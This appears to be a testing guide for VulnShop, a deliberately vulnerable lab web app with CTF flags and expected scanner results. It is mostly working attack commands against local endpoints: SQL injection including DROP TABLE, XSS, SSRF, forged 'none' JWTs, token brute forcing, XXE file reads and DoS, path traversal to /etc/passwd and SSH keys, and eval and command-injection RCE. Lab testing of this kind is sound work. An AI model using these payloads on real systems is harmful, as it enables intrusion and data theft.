# Testing Enhanced VulnShop Endpoints

Quick reference for manually testing all 30+ vulnerabilities.

---

## 0. Quest Mode (CTF)

```bash
# Quest board with hints
curl http://127.0.0.1:5000/flags

# Submit a flag
curl -X POST http://127.0.0.1:5000/api/submit-flag \
  -H "Content-Type: application/json" \
  -d '{"player":"your-name","flag":"VULNSHOP{...}"}'

# Standings
curl http://127.0.0.1:5000/api/leaderboard

# Flag behind forged admin JWT (none alg)
TOKEN=$(docker exec vulnshop python3 -c \
  "import jwt; print(jwt.encode({'user':'admin','is_admin':True}, '', algorithm='none'))")
curl "http://127.0.0.1:5000/api/admin-flag?token=$TOKEN"

# Flag behind 4-digit reset token (brute force)
for i in $(seq 1000 9999); do
  curl -s -X POST http://127.0.0.1:5000/api/reset-verify \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@vulnshop.local\",\"token\":\"$i\"}" | grep -q '"valid":true' \
    && echo "FOUND: $i" && break
done

# Flag in backup.zip
curl -s http://127.0.0.1:5000/backup.zip -o /tmp/backup.zip && unzip -p /tmp/backup.zip flag.txt
```

---

## 1. SQL Injection Endpoints

### /api/users (GET)
```bash
# Basic test
curl "http://127.0.0.1:5000/api/users?username=admin"

# SQLi payload - returns all users
curl "http://127.0.0.1:5000/api/users?username=' OR '1'='1"

# Column name injection via type parameter
curl "http://127.0.0.1:5000/api/users?username=test&type=email"
```

### /api/search-advanced (POST)
```bash
# SQLi in query parameter
curl -X POST http://127.0.0.1:5000/api/search-advanced \
  -H "Content-Type: application/json" \
  -d '{"query":"\" OR \"1\"=\"1"}'

# SQLi in filter (column name)
curl -X POST http://127.0.0.1:5000/api/search-advanced \
  -d 'query=test&filter=id OR 1=1;--'

# SQLi in sort parameter  
curl -X POST http://127.0.0.1:5000/api/search-advanced \
  -d 'query=test&sort=name; DROP TABLE users;--'
```

### /api/sql-exec (POST)
```bash
# Direct SQL execution - extract admin password
curl -X POST http://127.0.0.1:5000/api/sql-exec \
  -H "Content-Type: application/json" \
  -d '{"sql":"SELECT * FROM users WHERE is_admin=1"}'

# Extract sensitive data
curl -X POST http://127.0.0.1:5000/api/sql-exec \
  -H "Content-Type: application/json" \
  -d '{"sql":"SELECT username, password FROM users"}'
```

---

## 2. XSS Endpoints

### /greet (GET) - Existing, also works with new endpoints

### /api/comments (GET/POST)
```bash
# GET - retrieve stored XSS payloads
curl http://127.0.0.1:5000/api/comments

# POST - store XSS payload
curl -X POST http://127.0.0.1:5000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"comment":"<img src=x onerror=\"alert(1)\">"}'

# Form-based
curl -X POST http://127.0.0.1:5000/api/comments \
  -d 'comment=<script>alert("XSS")</script>'
```

---

## 3. SSRF Endpoints

### /api/fetch (POST)
```bash
# Fetch admin panel (SSRF)
curl -X POST http://127.0.0.1:5000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/admin"}'

# Fetch .env file via SSRF
curl -X POST http://127.0.0.1:5000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/.env"}'

# Attempt localhost access
curl -X POST http://127.0.0.1:5000/api/fetch \
  -d 'url=http://localhost:5000/api/debug'
```

### /api/proxy (POST) - Open Proxy
```bash
# Forward request to external site
curl -X POST http://127.0.0.1:5000/api/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url":"http://example.com",
    "method":"GET",
    "headers":{"User-Agent":"VulnShop"}
  }'

# POST request forwarding
curl -X POST http://127.0.0.1:5000/api/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url":"http://internal-service:8080/api",
    "method":"POST",
    "body":"{\"command\":\"delete\"}"
  }'
```

---

## 4. IDOR Endpoints

### /api/user/<id> (GET)
```bash
# View admin user (ID 1)
curl http://127.0.0.1:5000/api/user/1

# View other users
for i in {1..10}; do
  curl http://127.0.0.1:5000/api/user/$i
done

# Extract all user info
curl http://127.0.0.1:5000/api/user/999
```

### /api/orders (existing)
```bash
# View any order without auth
curl http://127.0.0.1:5000/api/orders/1
curl http://127.0.0.1:5000/api/orders/2
```

---

## 5. Authentication & JWT

### /api/generate-token (POST)
```bash
# Generate token for admin
curl -X POST http://127.0.0.1:5000/api/generate-token \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","is_admin":true}'

# Response: {"token":"eyJ0eXAiOiJKV1QiLCJhbGc..."}
```

### /api/verify-token (POST)
```bash
# Verify token (accepts 'none' algorithm)
curl -X POST http://127.0.0.1:5000/api/verify-token \
  -H "Content-Type: application/json" \
  -d '{"token":"<jwt_token_here>"}'

# Create token with 'none' algorithm and bypass verification
# Use PyJWT locally:
# import jwt
# token = jwt.encode({}, "", algorithm="none")
```

### /api/login-api (POST) - Weak Credentials
```bash
# Use hardcoded API key
curl -X POST http://127.0.0.1:5000/api/login-api \
  -H "Content-Type: application/json" \
  -d '{"api_key":"sk-1234567890abcdef"}'

# Try other hardcoded keys
curl -X POST http://127.0.0.1:5000/api/login-api \
  -d 'api_key=super-secret-api-key-2024'

# Try weak passwords
curl -X POST http://127.0.0.1:5000/api/login-api \
  -d 'username=admin&password=admin123'
```

---

## 6. Mass Assignment & Privilege Escalation

### /api/register (POST)
```bash
# Register with admin flag
curl -X POST http://127.0.0.1:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "password":"password123",
    "email":"attacker@example.com",
    "is_admin":true
  }'

# Response shows is_admin=true is accepted
```

---

## 7. Cryptography Issues

### /api/hash (POST) - Weak Hashing
```bash
# Demonstrate MD5/SHA1 weakness
curl -X POST http://127.0.0.1:5000/api/hash \
  -H "Content-Type: application/json" \
  -d '{"password":"password123"}'

# Shows MD5 and SHA1 hashes (easily cracked)
```

### /api/reset-password (POST) - Predictable Tokens
```bash
# Issue a reset token. The token is stored, not returned - like a real reset
# email would be - but the response advertises how it is built.
curl -X POST http://127.0.0.1:5000/api/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com"}'

# Token is 4 digits (1000-9999) AND deterministic:
#   int(md5(email.lower()), 16) % 9000 + 1000
# So it falls to brute force or to derivation. Check with /api/reset-verify.
python3 -c "import hashlib;e='admin@vulnshop.local';print(int(hashlib.md5(e.encode()).hexdigest(),16)%9000+1000)"
```

> Every POST endpoint accepts **either** a JSON body or form-encoded fields.
> `-d 'a=b'` and `-H 'Content-Type: application/json' -d '{"a":"b"}'` both work.

---

## 8. XXE Vulnerabilities

### /api/xxe (POST)
```bash
# File disclosure via XXE
curl -X POST http://127.0.0.1:5000/api/xxe \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'

# Entity expansion (DoS)
curl -X POST http://127.0.0.1:5000/api/xxe \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'
```

---

## 9. Information Disclosure

### /api/debug (GET)
```bash
# Retrieve all debug information
curl http://127.0.0.1:5000/api/debug

# Exposes:
# - SECRET_KEY
# - JWT_SECRET  
# - API_KEYS dictionary
# - DATABASE_PATH
# - All environment variables
```

### /api/files (GET)
```bash
# List files in /app/files
curl "http://127.0.0.1:5000/api/files?dir=/app/files"

# Path traversal to read other directories
curl "http://127.0.0.1:5000/api/files?dir=../../etc"

# List root directory
curl "http://127.0.0.1:5000/api/files?dir=/"
```

### /api/file-upload (POST)
```bash
# Upload arbitrary file
curl -X POST http://127.0.0.1:5000/api/file-upload \
  -F "file=@malicious.php" \
  -F "filename=shell.php"

# Upload shell script
echo '#!/bin/bash' > shell.sh
echo 'id' >> shell.sh
curl -X POST http://127.0.0.1:5000/api/file-upload \
  -F "file=@shell.sh"
```

---

## 10. LDAP Injection

### /api/ldap-search (POST)
```bash
# Wildcard injection
curl -X POST http://127.0.0.1:5000/api/ldap-search \
  -H "Content-Type: application/json" \
  -d '{"username":"admin*"}'

# Filter bypass
curl -X POST http://127.0.0.1:5000/api/ldap-search \
  -d 'username=*))(&'

# Attribute extraction
curl -X POST http://127.0.0.1:5000/api/ldap-search \
  -d 'username=admin*'
```

---

## 11. Code Injection

### /api/eval (POST)
```bash
# Python expression evaluation
curl -X POST http://127.0.0.1:5000/api/eval \
  -H "Content-Type: application/json" \
  -d '{"code":"1+1"}'

# RCE via eval
curl -X POST http://127.0.0.1:5000/api/eval \
  -d 'code=__import__("os").system("id")'

# Read files
curl -X POST http://127.0.0.1:5000/api/eval \
  -d 'code=open("/etc/passwd").read()'
```

---

## 12. Insecure Deserialization

### /api/deserialize (POST)
```bash
# Generate pickle payload (requires local Python)
python3 << 'EOF'
import pickle, base64

# Simple pickle object
data = {"username": "admin", "is_admin": True}
serialized = pickle.dumps(data)
encoded = base64.b64encode(serialized).decode()
print(f"curl -X POST http://127.0.0.1:5000/api/deserialize -d 'data={encoded}'")
EOF

# Send to vulnerable endpoint
curl -X POST http://127.0.0.1:5000/api/deserialize \
  -d "data=<base64_encoded_pickle>"
```

---

## 13. Security Headers

### Verify Missing Headers
```bash
# Check response headers
curl -I http://127.0.0.1:5000/

# Missing:
# Content-Security-Policy
# X-Frame-Options
# X-Content-Type-Options
# Strict-Transport-Security

# Present (misconfigured):
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true (bad combo!)
```

---

## 14. Path Traversal (Existing)

### /download (GET)
```bash
# Read system files
curl "http://127.0.0.1:5000/download?file=../../etc/passwd"
curl "http://127.0.0.1:5000/download?file=../../../root/.ssh/id_rsa"
```

---

## 15. Command Injection (Existing)

### /api/ping (GET)
```bash
# Command injection
curl "http://127.0.0.1:5000/api/ping?host=127.0.0.1;id"
curl "http://127.0.0.1:5000/api/ping?host=127.0.0.1;cat%20/etc/passwd"
```

---

## Automated Testing Script

```bash
#!/bin/bash
# bulk_test.sh - Test all endpoints quickly

TARGET="http://127.0.0.1:5000"

echo "[+] Testing SQL Injection endpoints..."
curl "$TARGET/api/users?username=' OR '1'='1" | head -20

echo "[+] Testing SSRF..."
curl -X POST $TARGET/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5000/admin"}'

echo "[+] Testing IDOR..."
curl "$TARGET/api/user/1"
curl "$TARGET/api/user/2"

echo "[+] Testing debug endpoint..."
curl "$TARGET/api/debug" | jq '.secret_key'

echo "[+] Testing JWT generation..."
curl -X POST $TARGET/api/generate-token \
  -H "Content-Type: application/json" \
  -d '{"username":"test","is_admin":true}'

echo "[+] Testing command injection..."
curl "$TARGET/api/ping?host=127.0.0.1;id"

echo "[+] Done! Check results above."
```

---

## Expected TraceON Scan Output

When running TraceON against enhanced VulnShop, expect:

```
SCAN RESULTS
============
Critical: 4-5 findings
  - Direct SQL execution (/api/sql-exec)
  - Code evaluation (/api/eval)
  - Insecure deserialization (/api/deserialize)
  - Pickle RCE potential
  - File upload + execution

High: 10-15 findings
  - SSRF (/api/fetch, /api/proxy)
  - SQL Injection (6 endpoints)
  - XXE (/api/xxe)
  - IDOR (2 endpoints)
  - LDAP injection

Medium: 8-12 findings
  - XSS endpoints
  - Weak JWT
  - Mass assignment
  - Weak crypto
  - Missing headers

Low: 5-8 findings
  - Directory listing
  - Information disclosure
  - Banner grabbing

Verified: 20-25 findings (SAST + DAST correlation)
Probable: 8-12 findings (SAST only)
Observed: 8-15 findings (DAST only)

Total: 35-50+ findings
```

---

## Notes

- All endpoints return JSON (if JSON is requested)
- All endpoints also accept form data (polyglot testing)
- No authentication required on any endpoint (by design)
- Database is SQLite at `/data/vulnshop.db`
- Logs available via Docker: `docker logs vulnshop`

